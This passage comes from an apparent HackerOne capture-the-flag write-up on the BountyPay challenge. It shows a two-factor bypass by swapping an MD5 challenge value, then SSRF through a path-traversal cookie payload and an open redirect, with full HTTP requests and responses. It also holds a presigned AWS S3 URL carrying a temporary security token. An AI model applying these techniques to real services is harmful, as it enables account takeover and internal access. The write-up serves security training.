src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/YjDL6Ug1BbMLoYzo28yEcHkg?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-06-01_at_5.29.03_PM.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-06-01_at_5.29.03_PM.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQR2ZO7R4K%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070628Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIGl53Fw9OoAeZDdXqNqIaPWdVjolNnalaCHAwbXpszPSAiEAwdHCK3x2n8ED7sSzsn1sTIqS3bguKd2LFUdH90SxxboqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDFnQ3ZZHIU4UMAvXOCqRA3wF0%2FhaPHMfYMs5a29VvIgRVY2eUJjhO2ZyE9nrbvBw99qQYURMnfpjG6qzK9RhUhaxnystL8FSjs1I9wVhv7kK6fGlwNHgR0S%2FwzzOYB4EaUAuHPPjDIaplYQHDQfhD3Jzk627x6y1whtGyRm1%2FbLU%2FMLC%2FEl2Y0VF3B2XYbmjMyMbEo%2F3JA2NhxILkWnIEx9Dc5OuLgUgvtMmXd8zqzlhwWk%2Fkbzt%2FA4PPw5G1805sqkgAV2ZtRMBvyI%2FHqrdrdjVcpE0L%2Fb3v3BTHE1AxOXymRI68r5QkUXAwvQReRh0UHKevdP2OKVlaJqNW4QPWf8V9sf08LOD6%2FIWFP2z6T0Ge7kmECxaLuqLfuqbJATPZaoduqk5WANfTo41R4vwOd0PfkzuCu4ENGZautDQdqCTqc5v4f3nC%2FmEA3lzVbD2GfnKNN5i6QTsolJiL8iHwoY3qRGnqUpWe6styqCssbnT2On6kImCyLv8PqTQIgD5tzKTZ%2Bk7rSp%2FUGyNQ%2Fzf7CwFfbirN8%2BZ0cy8FDVRQPOIMNrtqv8FOusBG5VJhuS959dYt8SgxT1B5qInUKkmqkB9xSwqpRIrJhHLlMpiW9hAt%2BdMLFZZhmn8J5%2BdfXBiq%2FwOuwlyUwREyyNiqFLd5q%2F2oDa1jv2FMMsir1my4yAqcT0R%2BuM9KWMCRIN%2F27CpS4%2BgKGfRpQrYqZnwFoh5vyTAfyKuQbQpvNQ5z0%2F7hQPQ1Fud3gWbMbKSBMyuMEkDvn42ZK0k1WvIYPRa53VXsGPwtTo7PZ2laExqLJsXRcULDGCx08GryRt%2B5IBSaDHktFU1HTGALrwf1yRufEBKHtOimqOWitGuYxfwQnKZ1ht%2BjmX2WQ%3D%3D\u0026amp;X-Amz-Signature=898032064115d525a6b7c6006486945b42f919c7d1f53b881ee49bbbbb7bdf8b\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"c\"\u003e\u0026lt;!-- relevant html from above--\u0026gt;\u003c/span\u003e\n...\n\u003cspan class=\"c\"\u003e\u0026lt;!-- user\u0026#39;s name --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;username\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;brian.oliver\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"c\"\u003e\u0026lt;!-- user\u0026#39;s password --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;password\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;V7h0inzX\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"c\"\u003e\u0026lt;!-- MD5 hash of the 10 char passcode sent to the user for verification --\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;hidden\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003ename=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;challenge\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;103fa83db8f4be6c61dee66f95e2bca0\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n...\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWe can assume the application will send a verification code but how can we grab it? \u003c/p\u003e\n\n\u003cp\u003eI had not noticed but the \u003ccode\u003echallenge\u003c/code\u003e value is 32 chars - after some time I realized \u003ccode\u003eMD5\u003c/code\u003e hashes have 32 chars, if we replace the \u003ccode\u003echallenge\u003c/code\u003e value for the \u003ccode\u003eMD5\u003c/code\u003e hash of the \u003ccode\u003echallenge_answer\u003c/code\u003e we found in the logs(bD83Jk27dQ) we can use this old token to gain access to the account. With this we can log into \u003ca href=\"/redirect?url=http%3A%2F%2Fapp.bountypay.h1ctf.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eapp.bountypay.h1ctf.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch3 id=\"app-bountypay-h1ctf-com\"\u003eapp.bountypay.h1ctf.com\u003c/h3\u003e\n\n\u003cp\u003eThe user \u003ccode\u003ebrian.oliver\u003c/code\u003e has access to this application, however there wasn\u0026#39;t much else so I started looking at \u003ccode\u003eapi\u003c/code\u003e calls - I noticed the \u003ccode\u003e/statements?month=04\u0026amp;year=2020\u003c/code\u003e request which was in the log file from before, and this is what it returned:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"w\"\u003e\n   \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eF8gHiqSdpK\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatements?month=01\u0026amp;year=2020\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"w\"\u003e\n   \u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;data\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;{\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003edescription\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eTransactions for 2020-01\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e,\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003etransactions\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e:[]}\u0026quot;\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLooks like it\u0026#39;s using \u003ccode\u003eapi.bountypay.h1ctf.com\u003c/code\u003e to get the information and then it returns a data object with the information - let\u0026#39;s remember this and keep going.\u003c/p\u003e\n\n\u003cp\u003eEventually I looked at the \u003ccode\u003eCookie\u003c/code\u003e values, and with some nudges noticed there was a path traversal in the cookie, which was just \u003ccode\u003ebase64\u003c/code\u003e json, the account_id probably gets passed to the api call to get the right account - this is when the \u003ccode\u003e/redirect?url=\u003c/code\u003e route from \u003ccode\u003eapi.bountypay.h1ctf.com\u003c/code\u003e came in handy since before we couldn\u0026#39;t make any interesting requests because there was a \u003ccode\u003ewhitelist\u003c/code\u003e - here it\u0026#39;s also important to note the \u003ccode\u003esoftware.bountypay.h1ctf.com\u003c/code\u003e subdomain which you can\u0026#39;t access because there\u0026#39;s an IP restriction(I tried the \u003ccode\u003eX-Forward-Host\u003c/code\u003e but it didn\u0026#39;t work), taking that into consideration - let\u0026#39;s try to make an internal request to that subdomain by using the following \u003ccode\u003ebase64\u003c/code\u003e encoded payload:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight json\"\u003e\u003ccode\u003e\u003cspan class=\"err\"\u003e//\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003edecoded\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003ecookie\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;account_id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;8FJ3KFISL3/../../../redirect?url=https://software.bountypay.h1ctf.com/BountyPay.apk#\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;hash\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;de235bffd23df6995ad4e0930baac1a2In0\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\n\u003c/span\u003e\u003cspan class=\"err\"\u003e//\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003erequest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eGET\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e/statements?month=\u003c/span\u003e\u003cspan class=\"mi\"\u003e04\u003c/span\u003e\u003cspan class=\"err\"\u003e\u0026amp;year=\u003c/span\u003e\u003cspan class=\"mi\"\u003e2020\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eHTTP/\u003c/span\u003e\u003cspan class=\"mf\"\u003e1.1\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eHost:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eapp.bountypay.h\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"err\"\u003ectf.com\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eConnection:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eclose\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003ePragma:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eno-cache\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eCache-Control:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eno-cache\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eAccept:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e*/*\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eUser-Agent:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eMozilla/\u003c/span\u003e\u003cspan class=\"mf\"\u003e5.0\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e(Macintosh;\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eIntel\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eMac\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eOS\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eX\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e10\u003c/span\u003e\u003cspan class=\"err\"\u003e_\u003c/span\u003e\u003cspan class=\"mi\"\u003e14\u003c/span\u003e\u003cspan class=\"err\"\u003e_\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"err\"\u003e)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eAppleWebKit/\u003c/span\u003e\u003cspan class=\"mf\"\u003e537.36\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e(KHTML,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003elike\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eGecko)\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eChrome/\u003c/span\u003e\u003cspan class=\"mf\"\u003e83.0\u003c/span\u003e\u003cspan class=\"err\"\u003e.\u003c/span\u003e\u003cspan class=\"mf\"\u003e4103.61\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eSafari/\u003c/span\u003e\u003cspan class=\"mf\"\u003e537.36\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eX-Requested-With:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eSec-Fetch-Site:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003esame-origin\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eSec-Fetch-Mode:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003ecors\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eSec-Fetch-Dest:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eempty\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eReferer:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003ehttps://app.bountypay.h\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"err\"\u003ectf.com/\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eAccept-Encoding:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003egzip,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003edeflate\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eAccept-Language:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003een-US,en;q=\u003c/span\u003e\u003cspan class=\"mf\"\u003e0.9\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eCookie:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003etoken=eyJhY\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"err\"\u003eNvdW\u003c/span\u003e\u003cspan class=\"mi\"\u003e50\u003c/span\u003e\u003cspan class=\"err\"\u003eX\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"err\"\u003elkIjoiRjhnSGlxU\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"err\"\u003eRwSy\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"err\"\u003euLi\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"err\"\u003euLi\u003c/span\u003e\u003cspan class=\"mi\"\u003e8\u003c/span\u003e\u003cspan class=\"err\"\u003euLi\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"err\"\u003eyZWRpcmVjdD\u003c/span\u003e\u003cspan class=\"mi\"\u003e91\u003c/span\u003e\u003cspan class=\"err\"\u003ecmw\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"err\"\u003eaHR\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"err\"\u003ecHM\u003c/span\u003e\u003cspan class=\"mi\"\u003e6\u003c/span\u003e\u003cspan class=\"err\"\u003eLy\u003c/span\u003e\u003cspan class=\"mi\"\u003e9\u003c/span\u003e\u003cspan class=\"err\"\u003ezb\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"err\"\u003eZ\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"err\"\u003ed\u003c/span\u003e\u003cspan class=\"mi\"\u003e2\u003c/span\u003e\u003cspan class=\"err\"\u003eFyZS\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"err\"\u003eib\u003c/span\u003e\u003cspan class=\"mi\"\u003e3\u003c/span\u003e\u003cspan class=\"err\"\u003eVudHlwYXkuaDFjdGYuY\u003c/span\u003e\u003cspan class=\"mi\"\u003e29\u003c/span\u003e\u003cspan class=\"err\"\u003etLyMiLCJoYXNoIjoiZGUyMzViZmZkMjNkZjY\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"err\"\u003eOTVhZDRlMDkzMGJhYWMxYTIifQ\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\n\u003c/span\u003e\u003cspan class=\"err\"\u003e//\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eresponse\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eHTTP/\u003c/span\u003e\u003cspan class=\"mf\"\u003e1.1\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e200\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eOK\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eServer:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003enginx/\u003c/span\u003e\u003cspan class=\"mf\"\u003e1.14\u003c/span\u003e\u003cspan class=\"err\"\u003e.\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003e(Ubuntu)\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eDate:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eMon,\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e01\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eJun\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e2020\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e22\u003c/span\u003e\u003cspan class=\"err\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e58\u003c/span\u003e\u003cspan class=\"err\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e07\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eGMT\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eContent-Type:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eapplication/json\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eConnection:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"err\"\u003eclose\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\u003c/span\u003e\u003cspan class=\"err\"\u003eContent-Length:\u003c/span\u003e\u003cspan class=\"w\"\u003e \u003c/span\u003e\u003cspan class=\"mi\"\u003e1621\u003c/span\u003e\u003cspan class=\"w\"\u003e\n\n\u003c/span\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;url\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eapi\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eF8gHiqSdpK\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e..\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e..\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e..\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003eredirect?url=https:\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003esoftware.bountypay.h1ctf.com\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003e#\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003estatements?month=04\u0026amp;year=2020\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"nl\"\u003e\u0026quot;data\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot;\u0026lt;!DOCTYPE html\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;html lang=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003een\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;head\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e    \u0026lt;meta charset=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eutf-8\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e    \u0026lt;meta http-equiv=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eX-UA-Compatible\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e content=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eIE=edge\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e    \u0026lt;meta name=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eviewport\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e content=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003ewidth=device-width, initial-scale=1\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e    \u0026lt;title\u0026gt;Software Storage\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003etitle\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e    \u0026lt;link href=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ecss\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ebootstrap.min.css\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e rel=\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003estylesheet\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\/\u003c/span\u003e\u003cspan class=\"s2\"\u003ehead\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;body\u0026gt;\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\\n\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026lt;div 